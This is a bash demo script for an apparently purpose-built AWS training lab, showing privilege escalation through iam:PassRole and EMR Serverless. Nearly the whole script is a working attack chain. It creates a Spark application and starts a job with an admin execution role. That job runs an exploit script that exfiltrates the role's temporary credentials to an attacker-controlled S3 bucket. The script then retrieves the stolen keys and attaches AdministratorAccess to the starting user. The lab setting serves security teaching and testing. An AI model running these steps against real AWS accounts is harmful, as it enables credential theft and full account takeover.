#!/bin/bash

# Demo script for iam:PassRole + emr-serverless:CreateApplication + emr-serverless:StartJobRun privilege escalation
# This scenario demonstrates how a user with PassRole, CreateApplication, and StartJobRun can escalate
# by creating an EMR Serverless Spark application that runs a job with an admin execution role,
# which exfiltrates admin credentials to S3 for the attacker to use.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-emr-serverless-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-emr-serverless-001-to-admin-admin-role"
EMR_APP_NAME="pl-prod-emr-serverless-001-to-admin-app"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + EMR Serverless CreateApplication + StartJobRun Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_emr_serverless_001_iam_passrole_emr_serverless_createapplication_emr_serverless_startjobrun.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
S3_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "S3 Bucket: $S3_BUCKET_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION]
# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION]
# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Retrieve pre-staged exploit script location from Terraform
echo -e "${YELLOW}Step 5: Retrieving pre-staged exploit script location${NC}"
echo "Script location: s3://$S3_BUCKET_NAME/scripts/exploit.py"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The PySpark exploit script is hosted in an attacker-controlled S3 bucket. The bucket${NC}"
echo -e "${BLUE}  policy grants the prod account read access (not via IAM, but via resource policy).${NC}"
echo -e "${BLUE}  If an attacker account is configured, this bucket lives in a separate AWS account.${NC}"
echo -e "${BLUE}  EMR Serverless jobs without VPC cannot reach iam.amazonaws.com directly, so the${NC}"
echo -e "${BLUE}  script exfiltrates admin execution role credentials to S3 for the attacker to retrieve.${NC}"
echo ""
echo -e "${GREEN}✓ Retrieved pre-staged script location${NC}\n"

# Step 6: Create EMR Serverless application
use_starting_creds
echo -e "${YELLOW}Step 6: Creating EMR Serverless Spark application${NC}"
echo "Application name: $EMR_APP_NAME"

show_attack_cmd "Attacker" "aws emr-serverless create-application --region $AWS_REGION --name $EMR_APP_NAME --release-label emr-7.7.0 --type SPARK --output json"
APP_RESULT=$(aws emr-serverless create-application \
    --region $AWS_REGION \
    --name "$EMR_APP_NAME" \
    --release-label "emr-7.7.0" \
    --type "SPARK" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create EMR Serverless application${NC}"
    exit 1
fi

APPLICATION_ID=$(echo "$APP_RESULT" | jq -r '.applicationId')
echo "Application ID: $APPLICATION_ID"
echo -e "${GREEN}✓ EMR Serverless application created${NC}\n"

# [OBSERVATION]
# Step 7: Wait for application to be in CREATED state
echo -e "${YELLOW}Step 7: Waiting for application to be ready${NC}"
echo "Polling application state..."
use_readonly_creds

MAX_WAIT=300
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws emr-serverless get-application --region $AWS_REGION --application-id $APPLICATION_ID --query 'application.state' --output text"
    APP_STATE=$(aws emr-serverless get-application \
        --region $AWS_REGION \
        --application-id "$APPLICATION_ID" \
        --query 'application.state' \
        --output text)

    echo "Application state: $APP_STATE"

    if [ "$APP_STATE" == "CREATED" ] || [ "$APP_STATE" == "STARTED" ]; then
        echo -e "${GREEN}✓ Application is ready (state: $APP_STATE)${NC}\n"
        break
    fi

    if [ "$APP_STATE" == "TERMINATED" ] || [ "$APP_STATE" == "STOPPED" ]; then
        echo -e "${RED}Error: Application entered unexpected state: $APP_STATE${NC}"
        exit 1
    fi

    sleep 15
    ELAPSED=$((ELAPSED + 15))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for application to be ready${NC}"
    exit 1
fi

# Step 8: Start job run with admin execution role (the privilege escalation)
use_starting_creds
echo -e "${YELLOW}Step 8: Starting job run with admin execution role${NC}"
echo "This is the privilege escalation vector - passing the admin role as the execution role..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Script location: s3://$S3_BUCKET_NAME/scripts/exploit.py"
echo "Credential exfil target: s3://$S3_BUCKET_NAME/exfil/creds.json"

EXFIL_KEY="exfil/creds.json"

show_attack_cmd "Attacker" "aws emr-serverless start-job-run --region $AWS_REGION --application-id $APPLICATION_ID --execution-role-arn $ADMIN_ROLE_ARN --job-driver '{\"sparkSubmit\":{\"entryPoint\":\"s3://$S3_BUCKET_NAME/scripts/exploit.py\",\"entryPointArguments\":[\"$S3_BUCKET_NAME\",\"$EXFIL_KEY\"],\"sparkSubmitParameters\":\"--conf spark.executor.cores=1 --conf spark.executor.memory=2g --conf spark.driver.cores=1 --conf spark.driver.memory=2g --conf spark.executor.instances=1\"}}' --output json"
JOB_RESULT=$(aws emr-serverless start-job-run \
    --region $AWS_REGION \
    --application-id "$APPLICATION_ID" \
    --execution-role-arn "$ADMIN_ROLE_ARN" \
    --job-driver '{
        "sparkSubmit": {
            "entryPoint": "s3://'"$S3_BUCKET_NAME"'/scripts/exploit.py",
            "entryPointArguments": ["'"$S3_BUCKET_NAME"'", "'"$EXFIL_KEY"'"],
            "sparkSubmitParameters": "--conf spark.executor.cores=1 --conf spark.executor.memory=2g --conf spark.driver.cores=1 --conf spark.driver.memory=2g --conf spark.executor.instances=1"
        }
    }' \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to start job run${NC}"
    exit 1
fi

JOB_RUN_ID=$(echo "$JOB_RESULT" | jq -r '.jobRunId')
echo "Job Run ID: $JOB_RUN_ID"
echo -e "${GREEN}✓ Job run started${NC}\n"

# [OBSERVATION]
# Step 9: Poll job run status until completion
echo -e "${YELLOW}Step 9: Waiting for job run to complete${NC}"
echo "Polling job run status every 30 seconds (10 minute timeout)..."
use_readonly_creds

MAX_WAIT=600
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws emr-serverless get-job-run --region $AWS_REGION --application-id $APPLICATION_ID --job-run-id $JOB_RUN_ID --query 'jobRun.state' --output text"
    JOB_STATE=$(aws emr-serverless get-job-run \
        --region $AWS_REGION \
        --application-id "$APPLICATION_ID" \
        --job-run-id "$JOB_RUN_ID" \
        --query 'jobRun.state' \
        --output text)

    echo "[$((ELAPSED / 60))m $((ELAPSED % 60))s] Job state: $JOB_STATE"

    if [ "$JOB_STATE" == "SUCCESS" ]; then
        echo -e "${GREEN}✓ Job run completed successfully!${NC}\n"
        break
    fi

    if [ "$JOB_STATE" == "FAILED" ] || [ "$JOB_STATE" == "CANCELLED" ]; then
        echo -e "${RED}Error: Job run entered state: $JOB_STATE${NC}"
        # Attempt to get error details
        JOB_DETAILS=$(aws emr-serverless get-job-run \
            --region $AWS_REGION \
            --application-id "$APPLICATION_ID" \
            --job-run-id "$JOB_RUN_ID" \
            --query 'jobRun.stateDetails' \
            --output text 2>/dev/null)
        if [ -n "$JOB_DETAILS" ] && [ "$JOB_DETAILS" != "None" ]; then
            echo "Details: $JOB_DETAILS"
        fi
        exit 1
    fi

    sleep 30
    ELAPSED=$((ELAPSED + 30))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for job run to complete (10 minutes)${NC}"
    echo "Job may still be running. Check the EMR Serverless console."
    exit 1
fi

# Step 10: Retrieve exfiltrated admin credentials from S3
echo -e "${YELLOW}Step 10: Retrieving exfiltrated admin credentials from S3${NC}"
echo "The Spark job extracted the admin execution role's temporary credentials"
echo "and wrote them to s3://$S3_BUCKET_NAME/$EXFIL_KEY"
use_readonly_creds

show_cmd "ReadOnly" "aws s3 cp s3://$S3_BUCKET_NAME/$EXFIL_KEY /tmp/stolen_creds.json --region $AWS_REGION"
aws s3 cp "s3://$S3_BUCKET_NAME/$EXFIL_KEY" /tmp/stolen_creds.json \
    --region $AWS_REGION

if [ ! -f /tmp/stolen_creds.json ]; then
    echo -e "${RED}Error: Could not retrieve exfiltrated credentials${NC}"
    exit 1
fi

STOLEN_ACCESS_KEY=$(jq -r '.AccessKeyId' /tmp/stolen_creds.json)
STOLEN_SECRET_KEY=$(jq -r '.SecretAccessKey' /tmp/stolen_creds.json)
STOLEN_SESSION_TOKEN=$(jq -r '.SessionToken' /tmp/stolen_creds.json)

echo "Stolen Access Key ID: ${STOLEN_ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved admin role credentials from S3${NC}\n"

# Step 11: Use stolen admin credentials to attach AdministratorAccess
echo -e "${YELLOW}Step 11: Using stolen admin credentials to escalate privileges${NC}"
echo "Switching to the exfiltrated admin role credentials to call IAM..."

# Temporarily use the stolen admin credentials
export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET_KEY"
export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"

# Verify we're now the admin role
show_cmd "StolenAdmin" "aws sts get-caller-identity"
STOLEN_IDENTITY=$(aws sts get-caller-identity --output json 2>&1)
echo "$STOLEN_IDENTITY" | jq '.' 2>/dev/null || echo "$STOLEN_IDENTITY"
echo ""

# Attach AdministratorAccess to the starting user
echo "Attaching AdministratorAccess to $STARTING_USER..."
show_attack_cmd "StolenAdmin" "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
aws iam attach-user-policy \
    --user-name "$STARTING_USER" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ AdministratorAccess attached to $STARTING_USER!${NC}"
else
    echo -e "${RED}Error: Failed to attach AdministratorAccess${NC}"
    rm -f /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Step 12: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 12: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take up to 15 seconds to be effective..."
sleep 15
echo -e "${GREEN}✓ Policy propagation complete${NC}\n"

# [OBSERVATION]
# Step 13: Verify privilege escalation
use_readonly_creds
echo -e "${YELLOW}Step 13: Verifying privilege escalation${NC}"
echo "Checking if AdministratorAccess is now attached to starting user..."

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output json"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --output json)

ADMIN_ATTACHED=$(echo "$ATTACHED_POLICIES" | jq -r '.AttachedPolicies[] | select(.PolicyArn == "arn:aws:iam::aws:policy/AdministratorAccess") | .PolicyName')

if [ -n "$ADMIN_ATTACHED" ]; then
    echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
else
    echo -e "${RED}✗ AdministratorAccess not found on user${NC}"
    rm -f /tmp/stolen_creds.json
    exit 1
fi
echo ""

echo "Attempting to list IAM users..."
show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    rm -f /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Clean up temporary files
rm -f /tmp/stolen_creds.json

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, emr-serverless:CreateApplication, emr-serverless:StartJobRun)"
echo "2. Referenced pre-staged PySpark exploit script in attacker-controlled S3 bucket"
echo "3. Created EMR Serverless Spark application"
echo "4. Started job run with admin execution role ($ADMIN_ROLE_NAME)"
echo "5. Spark job exfiltrated admin role credentials to S3 (IAM not reachable without VPC)"
echo "6. Retrieved stolen credentials and used them to attach AdministratorAccess to $STARTING_USER"
echo "7. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (emr-serverless:CreateApplication) → Spark application"
echo "  → (iam:PassRole + emr-serverless:StartJobRun with $ADMIN_ROLE_NAME)"
echo "  → Spark job exfiltrates admin creds to S3"
echo "  → Attacker retrieves creds → (iam:AttachUserPolicy) → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- EMR Serverless Application: $EMR_APP_NAME (ID: $APPLICATION_ID)"
echo "- Job Run ID: $JOB_RUN_ID"
echo "- Exfiltrated credentials: s3://$S3_BUCKET_NAME/exfil/creds.json"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The EMR Serverless application is still deployed${NC}"
echo -e "${RED}⚠ AdministratorAccess is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
